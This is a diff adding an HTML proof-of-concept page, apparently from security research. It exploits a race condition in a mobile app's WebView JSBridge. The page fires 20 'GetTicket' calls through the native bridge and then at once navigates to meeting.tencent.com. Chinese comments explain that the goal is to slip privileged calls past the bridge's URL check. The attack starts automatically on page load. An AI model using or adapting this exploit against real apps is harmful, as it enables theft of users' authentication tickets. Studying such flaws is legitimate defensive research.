@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>Race Test</title></head>
+<body>
+<h2>JSBridge Race Condition Test</h2>
+<pre id="log"></pre>
+<button id="btn" onclick="doRace()">Start Race Test</button>
+<script>
+var log = document.getElementById('log');
+function addLog(s) {
+    log.textContent += '[' + Date.now() + '] ' + s + '\n';
+    console.log(s);
+}
+
+// JSBridge 调用函数
+function callJSBridge(module, method, params) {
+    var callId = 'race_' + Date.now();
+    var msg = JSON.stringify({
+        module: module,
+        method: method,
+        event_name: callId,
+        params: params || {}
+    });
+    try {
+        // 通过 JSCallJavaMgr 接口调用
+        JSCallJavaMgr.JSCallNative(module, msg);
+        addLog('JSBridge sent: ' + module + '.' + method);
+    } catch(e) {
+        addLog('JSBridge error: ' + e);
+    }
+}
+
+function doRace() {
+    addLog('=== Race Test Start ===');
+    addLog('Current URL: ' + window.location.href);
+
+    // 策略: 快速连续发多个 JSBridge 调用，然后立即 navigate
+    // 目标: JSBridge IPC 排队在 Binder 线程池，navigate 的 LoadUrl IPC 也排队
+    // 如果 LoadUrl 的 IPC 先于某个 JSBridge IPC 被处理，就能改变 real_time_url
+
+    // 1. 发送敏感 JSBridge 调用（批量）
+    for (var i = 0; i < 20; i++) {
+        callJSBridge('CommonPlugin', 'GetTicket', {ticket_type: 0});
+    }
+
+    // 2. 立刻 navigate 到合法域名
+    addLog('Navigating to meeting.tencent.com...');
+    window.location.href = 'https://meeting.tencent.com/';
+
+    // 备选: 用 iframe 来触发 LoadUrl 而不离开当前页面
+    // var iframe = document.createElement('iframe');
+    // iframe.src = 'https://meeting.tencent.com/';
+    // document.body.appendChild(iframe);
+}
+
+// 自动执行（延迟 1 秒等 JSBridge 接口注册完成）
+setTimeout(function() {
+    addLog('Auto-starting race test in 2s...');
+    setTimeout(doRace, 2000);
+}, 1000);
+</script>
+</body>
+</html>
